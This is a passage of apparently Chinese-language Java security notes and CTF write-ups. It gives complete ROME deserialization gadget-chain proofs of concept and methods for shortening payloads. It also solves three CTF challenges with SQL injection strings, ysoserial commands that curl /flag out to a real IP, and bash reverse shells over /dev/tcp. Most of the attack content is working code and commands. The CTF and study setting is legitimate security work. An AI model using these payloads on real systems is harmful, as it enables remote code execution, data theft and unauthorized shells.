ClassPool.getDefault().get(JDK7u21.Evil.class.getName()).toBytecode() }); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); ObjectBean objectBean = new ObjectBean(String.class,\"ricky\"); // Properties Map properties = new Properties(); properties.put(objectBean, \"anything\"); // Hashtable // Map hashtable = new Hashtable(); // hashtable.put(objectBean, \"anything\"); // HashMap // Map expMap = new HashMap(); // expMap.put(objectBean,\"anything\"); // 根据链子推断写法 ToStringBean toStringBean = new ToStringBean(Templates.class, templates); EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean); setFieldValue(objectBean,\"_equalsBean\",equalsBean); // ysoserial 写法 // ObjectBean evalBean = new ObjectBean(Templates.class, templates); // setFieldValue(objectBean,\"_equalsBean\",new EqualsBean(ObjectBean.class, evalBean)); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(properties); // oos.writeObject(hashtable); // oos.writeObject(expMap); oos.close(); System.out.println(URLEncoder.encode(Base64.encodeBase64String(barr.toByteArray()))); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } BadAttributeValueExpException 变式 jdk1.8之后可以通过BadAttributeValueExpException类直接在readObject处触发toString方法, 于是链子也就变得简洁一些 TemplatesImpl.getOutputProperties() NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) NativeMethodAccessorImpl.invoke(Object, Object[]) DelegatingMethodAccessorImpl.invoke(Object, Object[]) Method.invoke(Object, Object...) ToStringBean.toString(String) ToStringBean.toString() BadAttributeValueExpException.readObject() POC package ROME; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import org.apache.commons.codec.binary.Base64; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URLEncoder; /** * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * BadAttributeValueExpException.readObject() **/ public class ROME_BadAttributeValueExpException { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ ClassPool.getDefault().get(JDK7u21.Evil.class.getName()).toBytecode() }); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class, templates); /*jdk1.8*/ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); setFieldValue(badAttributeValueExpException,\"val\",toStringBean); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(badAttributeValueExpException); oos.close(); System.out.println(URLEncoder.encode(Base64.encodeBase64String(barr.toByteArray()))); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } EqualsBean 变式 参考: https://www.yuque.com/jinjinshigekeaigui/qskpi5/cz1um4 equals方法调用了 beanEquals方法, 通过Hashtable/HashMap的equals进入, 参考 CC7 POC package ROME; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.syndication.feed.impl.EqualsBean; import javassist.ClassPool; import org.apache.commons.codec.binary.Base64; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; public class ROME_EqualsBean { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ ClassPool.getDefault().get(JDK7u21.Evil.class.getName()).toBytecode() }); setFieldValue(templates,\"_name\",\"r\"); setFieldValue(templates,\"_class\",null); // setFieldValue(obj,\"_tfactory\",new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\"r\"); // HashMap map1 = new HashMap(); // HashMap map2 = new HashMap(); // map1.put(\"yy\",bean); // map1.put(\"zZ\",templates); // map2.put(\"zZ\",bean); // map2.put(\"yy\",templates); // Hashtable table = new Hashtable(); // table.put(map1,\"1\"); // table.put(map2,\"2\"); // 测试后发现可以直接用HashMap.equal Map hashMap = new HashMap(); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(\"yy\",bean); map1.put(\"zZ\",templates); map2.put(\"zZ\",bean); map2.put(\"yy\",templates); hashMap.put(map1, \"\"); hashMap.put(map2, \"\"); setFieldValue(bean,\"_beanClass\",Templates.class); setFieldValue(bean,\"_obj\",templates); //序列化 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(table); oos.close(); System.out.println(Base64.encodeBase64String(baos.toByteArray())); //反序列化 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{ Field field = obj.getClass().getDeclaredField(fieldname); field.setAccessible(true); field.set(obj,value); } } 极致缩短payload 可以参考方法: 字节层面优化 javassist 生成模板而不去用ASM操作 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\"r\"); CtClass superClass = pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"); ctClass.setSuperclass(superClass); CtConstructor constructor = CtNewConstructor.make(\"public r(){Runtime.getRuntime().exec(\\\"calc.exe\\\");}\", ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); ctClass.defrost(); java底层(彻底将原先类多余的继承和规则取消，直接继承Serializable) 剔除 TemplatesImpl 部分属性 字节层面优化 参考 4rain 师傅基于ASM实现删除LINENUMBER ，4rain师傅实现了对字节码 LINENUMBER指令的阻止传递， 极大程度缩短了payload长度。 从java原生类上删减 在前面几种删减的基础上，几乎已经将payload缩小至极致，但是寻求本质， 序列化是将对象的状态信息转换为可存储或传输的形式的过程，当我们需要这个对象时，再从这些⼆进制流中反序列化出对象。所以可以在一些继承关系复杂的类上进行再次缩短的尝试。 来看一个简单的例子 class A extends B{ public String a; public A(String a){ this.a = a; } public void a(){ System.out.println(this.a); } private synchronized void writeObject(ObjectOutputStream s) throws IOException { s.defaultWriteObject(); } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object a = gf.get(\"a\", null); System.out.println(a); } } class B implements Serializable{ public String b; public void setB(String b) { this.b = b; } public void b(){ System.out.println(this.b); } } 这是一个A为子类，B为父类且A类继承B类的可序列化的规则，那么假设我们只需要A类的属性和方法，不需要B类上的任何属性和方法，能否做到只序列化的A类而不涉及B类？ 一般来说，直接通过序列化继承父类的子类，在输出的二进制文件中总是可以找到父类的影子，同时java原生类不可直接进行覆写，假设我们能够覆写上述的A类，我要实现上述的目标我只需要建立如下的A类 class A implements Serializable{ private static final long serialVersionUID = 8884587499101437051L; public String a; public A(String a){ this.a = a; } public void a(){ System.out.println(this.a); } private synchronized void writeObject(ObjectOutputStream s) throws IOException { s.defaultWriteObject(); } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object a = gf.get(\"a\", null); System.out.println(a); } } 那么我们再次序列化的时候生成的二进制文件就会相较于原先继承B类的A类缩短许多，于是你直接拿着生成的新的二进制文件尝试在原有的关系上进行反序列化， 会发现java爆出如下错误 Exception in thread \"main\" java.io.InvalidClassException: A; local class incompatible: stream classdesc serialVersionUID = -7257149293589931179, local class serialVersionUID = 8884587499101437051 这里就涉及到 serialVersionUID 的概念。以下为个人理解，详细可参考 为什么serialVersionUID不能随便改 serialVersionUID 虚拟机是否允许反序列化， 不仅取决于类路径和功能代码是否⼀致， ⼀个⾮常重要的⼀点是两个类的序列化 ID 是否⼀致， 即serialVersionUID要求⼀致。 同时这涉及到了 Serializable 和 Externalizable 接口的问题 类通过实现 java.io.Serializable 接口以启用其序列化功能。未实现此接口的类将无法进行序列化或反序列化。可序列化类的所有子类型本身都是可序列化的。 如果查阅过Serializable的源码，就会发现，它只是一个空的接口，里面什么东西都没有，Serializable接口没有方法或字段，仅用于标识可序列化的语义。 那么它是怎么保证只有实现了该接口的方法才能进行序列化和反序列化呢？原因是在执行序列化的过程中，在 java.io.ObjectOutputStream#writeObject0 中执行了如下代码 if (obj instanceof String) { writeString((String) obj, unshared); } else if (cl.isArray()) { writeArray(obj, desc, unshared); } else if (obj instanceof Enum) { writeEnum((Enum) obj, desc, unshared); } else if (obj instanceof Serializable) { writeOrdinaryObject(obj, desc, unshared); } else { if (extendedDebugInfo) { throw new NotSerializableException( cl.getName() + \"\\n\" + debugInfoStack.toString()); } else { throw new NotSerializableException(cl.getName()); } } 在进行序列化操作时，会判断要被序列化的类是否是Enum、Array和Serializable类型，如果都不是则直接抛出NotSerializableException。 Java中还提供了Externalizable接口，也可以实现它来提供序列化能力，但是使用时需要开发人员重写writeExternal()与readExternal()这两个抽象方法。 自定义的序列化策略 在序列化过程中，如果被序列化的类中定义了writeObject 和 readObject 方法，虚拟机会试图调用对象类里的 writeObject 和 readObject 方法，进行用户自定义的序列化和反序列化。 如果没有这样的方法，则默认调用是 ObjectOutputStream 的 defaultWriteObject 方法以及 ObjectInputStream 的 defaultReadObject 方法。 但是我们可以去找几个java中实现序列化接口的类，可以发现这些类除了实现了Serializable外，还定义了一个serialVersionUID java.lang.String java.util.HashMap 确定serialVersionUID的重要性 谈及之前的报错，我们可以跟进到 javaio.ObjectStreamClass#initNonProxy，其中涉及 serialVersionUID 代码如下 if (model.serializable == osc.serializable && !cl.isArray() && suid != osc.getSerialVersionUID()) { throw new InvalidClassException(osc.name, \"local class incompatible: \" + \"stream classdesc serialVersionUID = \" + suid + \", local class serialVersionUID = \" + osc.getSerialVersionUID()); } 在反序列化过程中，对serialVersionUID做了比较，如果发现不相等，则直接抛出异常。 深入 getSerialVersionUID 方法 public long getSerialVersionUID() { // REMIND: synchronize instead of relying on volatile? if (suid == null) { suid = AccessController.doPrivileged( new PrivilegedAction() { public Long run() { return computeDefaultSUID(cl); } } ); } return suid.longValue(); } 在没有定义serialVersionUID的时候，会调用computeDefaultSUID 方法，生成一个默认的serialVersionUID。也就是说java会在反序列化的时候对其 serialVersionUID 做严格的校验。 但是，只要版本号相同，即使更改了序列化属性，对象也可以正确被反序列化回来。 使用默认机制在序列化对象时，不仅会序列化当前对象，还会对该对象引用的其它对象也进行序列化，同样地，这些其它对象引用的另外对象也将被序列化。 当然我还没有足够丰富的经验去直接修改它们之间的交互，但是可以肯定的是我们能够在不修改 serialVersionUID 的情况下尽可能的删减我们不需要的part，让整个序列化变得更简约，生成的二进制数据也就会更简短。 通过serialVersionUID控制兼容性 也就是我们在上述的例子中给继承父类序列化的子类A和自己可单独序列化的A类通过 serialVersionUID 规定一个标准 private static final long serialVersionUID = 8884587499101437051L; 序列化后会发现与原生成的二进制文件在字节数目上没有改变，而是修改了其中几个字节，再次尝试反序列化会发现可以生成这两种不同A类的对象，java自身达到了兼容性，而我们也在此基础上进一步缩短了payload的长度。 自定义java原生类 测试后发现在 BadAttributeValueExpException 继承关系和 TemplatesImpl 属性上稍作文章不会影响这个序列化过程， 尤其是在定义 BadAttributeValueExpException 本身可序列化后大幅度缩短payload长度，采取的方式是通过idea对应版本编译class来修改 jre/lib/rt.jar 中class。 public class BadAttributeValueExpException implements Serializable { private static final long serialVersionUID = -3105272988410493376L; private Object val; ... 因为本身在ROME链的调用中我们只需要 javax.management.BadAttributeValueExpException#readObject，而实现此方法只需要 BadAttributeValueExpException 本身继承序列化的接口即可，保证 serialVersionUID 一致即可 在 TemplatesImpl 对象中，Templates接口和 Serailizable接口是反序列化的关键， 而_transletIndex 在整个反序列化的过程不会起到任何作用，此外在 newTransformer 方法中如下是触发恶意类注入的关键语句 transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); 但是我们只执行 getTransletInstance 方法并且 _tfactory 会在readObject方法中自动赋值 private void readObject(ObjectInputStream is) throws IOException, ClassNotFoundException { is.defaultReadObject(); if (is.readBoolean()) { _uriResolver = (URIResolver) is.readObject(); } _tfactory = new TransformerFactoryImpl(); } 在执行 getTransletInstance 的过程中会完成恶意类的执行，剩下的两个参数 _outputProperties 和 _indentNumber只需要存在即可，但我们不需要将其写入我们的二进制文件中而是由java版本自己兼容赋值为null和0 这两步综合可以在原先对字节的追求上再缩短45%。 "},"javanote/javatest.html":{"url":"javanote/javatest.html","title":"Java相关题型复现","keywords":"","body":"Java Test 记录Java题的过程 maven项目快速搭建 [网鼎杯 2020 朱雀组]Think Java 源码给了 class, 反编译审计, 主要是 Test.class 和 sqlDict.class, Test.class 调用 sqlDict.class @CrossOrigin @RestController @RequestMapping({\"/common/test\"}) public class Test { public Test() { } @PostMapping({\"/sqlDict\"}) @Access @ApiOperation(\"为了开发方便对应数据库字典查询\") public ResponseResult sqlDict(String dbName) throws IOException { List tables = SqlDict.getTableData(dbName, \"root\", \"abc@12345\"); return ResponseResult.e(ResponseCode.OK, tables); } } 根据 import 和 api接口判定他是 swagger-ui import io.swagger.annotations.ApiOperation; 常用的有 swagger-ui.html, 进入后两个接口, 一个需要用户名密码登录, 另一个就是字典查询 String sql = \"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '\" + dbName + \"' and table_name='\" + TableName + \"';\"; 直接拼接的所以尝试有没有 sql注入, jdbc连接示例 jdbc:mysql://127.0.0.1:3306/name?useUnicode=true&xx=xxxx&xx=xx 尝试 sql注入 ?dbName=myapp?useUnicode=-1'union+select+database()%23 ?dbName=myapp?useUnicode=-1'union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema='myapp'%23 ?dbName=myapp?useUnicode=-1'union+select+group_concat(column_name)+from+information_schema.columns+where+table_name='user'%23 ?dbName=myapp?useUnicode=-1'union+select+group_concat(id,'~',name,'~',pwd)+from+user%23 得到用户名密码 admin/admin@Rrrr_ctf_asde 登录成功后给了一长串data { \"data\":\"Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\", \"msg\":\"登录成功\", \"status\":2, \"timestamps\":1627307693537 } 下方的特征可以作为序列化的标志参考: 一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。 或者如果以aced开头，那么他就是这一段java序列化的16进制。 参考后先将数据做处理 # -*-coding:utf-8-*- # python 2.7 import base64 data = \"rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\" r = base64.b64decode(data).encode('hex') print(r) 下载 , 使用 java -jar SerializationDumper-v1.13.ja r aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c0002696474 00104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372 000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e 756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 24 - 0x00 18 Value - cn.abc.core.model.UserVo - 0x636e2e6162632e636f72652e6d6f64656c2e55736572566f serialVersionUID - 0x76 46 43 31 7b 04 f4 3a newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 2 - 0x00 02 Fields 0: Object - L - 0x4c fieldName Length - 2 - 0x00 02 Value - id - 0x6964 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 16 - 0x00 10 Value - Ljava/lang/Long; - 0x4c6a6176612f6c616e672f4c6f6e673b 1: Object - L - 0x4c fieldName Length - 4 - 0x00 04 Value - name - 0x6e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 02 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 03 classdata cn.abc.core.model.UserVo values id (object) TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 14 - 0x00 0e Value - java.lang.Long - 0x6a6176612e6c616e672e4c6f6e67 serialVersionUID - 0x3b 8b e4 90 cc 8f 23 df newHandle 0x00 7e 00 04 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 1 - 0x00 01 Fields 0: Long - L - 0x4a fieldName Length - 5 - 0x00 05 Value - value - 0x76616c7565 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_CLASSDESC - 0x72 className Length - 16 - 0x00 10 Value - java.lang.Number - 0x6a6176612e6c616e672e4e756d626572 serialVersionUID - 0x86 ac 95 1d 0b 94 e0 8b newHandle 0x00 7e 00 05 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 06 classdata java.lang.Number values java.lang.Long values value (long)1 - 0x00 00 00 00 00 00 00 01 name (object) TC_STRING - 0x74 newHandle 0x00 7e 00 07 Length - 5 - 0x00 05 Value - admin - 0x61646d696e 最下方有这样一段包含着admin字段，它就相当于保存着实质信息的数据块, 当把序列化的token字段作为Authorization去印证这个UI的user/current接口。他也会显示成功登录。这说明，他会在current接口进行反序列化！那么可以构造合适的序列化内容来构造getshell 如何构造? java反序列化工具ysoserial ysoserial用法:以ROME和URLDNS举例 即用ROME(我现在的认知就是他每一种都有不同的作用，比如rome可以命令执行，URLDNS可以进行dns回显)。 java -jar ysoserial.jar ROME \"calc.exe\" > h3zh1.bin java -jar ysoserial.jar URLDNS \"http://xxx\" > h3zh1.bin 再转base64即可, 这里可能没有 bash 所以 shell 弹不出来, 用 curl 数据外带(命令执行那个 payload不好生成) java -jar ysoserial.jar ROME \"curl http://39.97.114.43:8888 -F file=@/flag\" > outcome.bin java -jar ysoserial.jar ROME \"curl http://39.97.114.43:8888 -d @/flag\" > outcome.bin 然后写个加密脚本burpsuite打过去公网监听即可 # -*-coding:utf-8-*- # python 2.7 import base64 file = open(\"outcome.bin\", \"rb\") now = file.read() ba = base64.b64encode(now) # print(ba) print(\"Bearer \"+ba) #可以解注释此段，并注释上一条print,便于快速测试 file.close() [V&N2020 java反序列化]EasySpringMVC 给了 war包, 解压后通过 fernflower.jar 进行反编译得到原有的 java文件 java -jar fernflower.jar .\\springmvcdemo_2 .\\springmvcdemo IDEA 没有Spring项目的解决方法 IDEA是2020版本，且是旗舰版，但今天想新建一个SpringMVC项目的时候，发现没有Spring选项。 解决方案: 按快捷键组合ctrl+alt+shift+/，然后选register，接着找到javaee.legacy.project.wizard，选中，close就好了 在IDEA新建一个Spring项目，并勾选SpringMVC, 将反编译后文件夹内的com包拖到src目录，lib目录的jar复制到lib目录，WEB-INF目录也替换掉, 然后在File->Project Structure添加lib的路径 接着, 添加tomcat服务器，并设置ApplicationContext，这个值表示webapp的访问根路径 然后启动即可访问 webapp, 但是没有太大收获, 看看web.xml, web.xml是J2EE定义的描述这个webapp的一个配置文件，非常重要。内容如下。 contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener clientinfo com.filters.ClentInfoFilter clientinfo * dispatcher org.springframework.web.servlet.DispatcherServlet 1 dispatcher *.form 最下面这段 dispatcher *.form 该配置文件用servlet-mapping指明所有*.form格式路径的访问交给名为dispatcher的servlet处理。servlet就是处理HTTP请求的核心类。 dispatcher org.springframework.web.servlet.DispatcherServlet 1 再看这一段，表明这个dispatcher servlet是一个org.springframework.web.servlet.DispatcherServlet，也就是说这个webapp使用了Spring框架。 clientinfo com.filters.ClentInfoFilter clientinfo * 这一段定义了一个 filter, 表示对所有servlet的访问，都需要经过com.filters.ClentInfoFilter类。filter的作用一般是在HTTP请求到达servlet之前或之后，对HTTP请求或响应进行处理，比如检查这个请求是否拥有权限。 在对Controller仔细排查后没有发现任何有用信息，关注点转移到这个filter上。 public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { Cookie[] cookies = ((HttpServletRequest)request).getCookies(); boolean exist = false; Cookie cookie = null; if(cookies != null) { Cookie[] encoder = cookies; int e = cookies.length; for(int bytes = 0; bytes 获取的cookie 建立一个数组格式, 然后再传给encoder 数组, 通过循环找到cookie 中是否有命名为 cinfo 的cookie, 有就赋值exist为true, 读取结束继续往下走 byte[] var20; if(exist) { String var16 = cookie.getValue(); Decoder var18 = Base64.getDecoder(); var20 = var18.decode(var16); ClientInfo var21 = null; if(!var16.equals(\"\") && var20 != null) { try { var21 = (ClientInfo)Tools.parse(var20); } catch (Exception var14) { var14.printStackTrace(); } } else { 这里exit判为true就走if, 会把cinfo值下的数据 base64 解密, 然后不为空就往 if 里面的 try 走, 执行 (ClientInfo)Tools.parse(var20), else的那些往下走貌似没有可利用的点, 先跟进 if 里面的 Tools public class Tools implements Serializable { private static final long serialVersionUID = 1L; private String testCall; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])((String[])obj))).start(); } } Java的反序列化和PHP反序列化类似，php在反序列化的时候会调用对应类的__wakeup()函数，而java会调用该类readObject()函数。 可以看到 readObject 是一个很危险的利用点, 直接反序列化我们传入的cinfo解密的值, 无条件命令执行 Object obj = in.readObject(); (new ProcessBuilder((String[])((String[])obj))).start(); java.lang.ProcessBuilder.start() 方法使用此进程生成器的属性来启动一个新进程。新进程将调用command()命令和参数(假设)，在工作目录所给出的directory()，有一个过程的环境所给出的environment()。此方法检查该命令是一个有效的操作系统命令。这命令是有效取决于系统，但最起码的命令必须非空字符串的非空列表。 法一: 在java中readObject可以直接读取 writeObject的内容, 由此在Tools类重写WriteObject方法 private void writeObject(ObjectOutputStream out) throws IOException,ClassNotFoundException { String command[] = {\"bash\", \"-c\", \"bash -i>& /dev/tcp/39.97.114.43/8888 0>&1\"}; out.writeObject(command); } 然后建立 payload public class Main { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); Tools.parse(bytes); } catch (Exception e) { e.printStackTrace(); } } } 法二: 让obj为Tools私有变量的testCall，通过ClentInfoFilter过滤器，出发Tools类的parse方法调用Tools类readObject()，进而调用 (new ProcessBuilder((String[])((String[])obj))).start(), 由此让testCall等于要进行的命令，就可以RCE了 package com.tools; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class Tools implements Serializable { private static final long serialVersionUID = 1L; private String testCall[]; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } public void setTestCall(String[] testCall) { this.testCall = testCall; } } 赋值给 testCall 再写入命令执行 public class Main { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); String commands[] = {\"bash\", \"-c\", \"bash -i>& /dev/tcp/39.97.114.43/8888 0>&1\"}; cinfo.setTestCall(commands); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } } } 然后修改 cookie 的 cinfo 刷新即可 [东华杯 2021]Ezgadget 反编译, 把导出的lib包 Add as library 也就是作为资源包(可调用类), 然后 debug ctfApplication 进行调试, tools中有个类 ToStringBean package com.ezgame.ctf.tools; import java.io.*; public class ToStringBean extends ClassLoader implements Serializable { private byte[] ClassByte; @Override public String toString() { final ToStringBean toStringBean = new ToStringBean(); final Class clazz = toStringBean.defineClass(null, this.ClassByte, 0, this.ClassByte.length); Object Obj = null; try { Obj = clazz.newInstance(); } catch (InstantiationException e) { e.printStackTrace(); } catch (IllegalAccessException e2) { e2.printStackTrace(); } return \"enjoy it.\"; } } 使用了 defineClass, this.ClassByte 可控, 给出一个 defineClass 加载字节码的实例 import javassist.ClassPool; import javassist.CtClass; import java.lang.reflect.Method; public class Hello { public static void main(String[] args) throws Exception{ ClassPool classpool= ClassPool.getDefault(); CtClass hello = classpool.makeClass(\"Hello\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; hello.makeClassInitializer().insertBefore(cmd); byte[] classbyte = hello.toBytecode(); Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); Class testhello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Hello\", classbyte, 0, classbyte.length); testhello.newInstance(); } } 可以得知 defineClass(String.class, byte[].class, int.class, int.class); String.class 是加载类的命名 byte[].class 存放的是类的字节码 第三个 int.class 默认为 0, 猜测是开始位置 第四个 int.class 传入字节码的长度 本题我们需要触发 Tools 类中的 toString 方法来触发字节码加载, 全局搜索 jdk 中 readObject 调用 toString 方法, 其实发现CC5中有个 BadAttributeValueExpException 可以触发 toString private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); } } 我们只需要控制 val 为 ToStringBean , 然后控制 ToStringBean 中的 this.ClassByte 为我们自己所构建的字节码即可, 构造 EXP package com.ezgame.ctf.controller; import com.ezgame.ctf.tools.ToStringBean; import javassist.ClassPool; import javassist.CtClass; import javax.management.BadAttributeValueExpException; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URLEncoder; import java.util.Base64; public class Poctest { public static void main(String[] args) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass evil = pool.makeClass(\"evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"bash -c bash$IFS$9-i>&/dev/tcp/169.254.191.77/23337 然后通过 /readObject?data= 触发 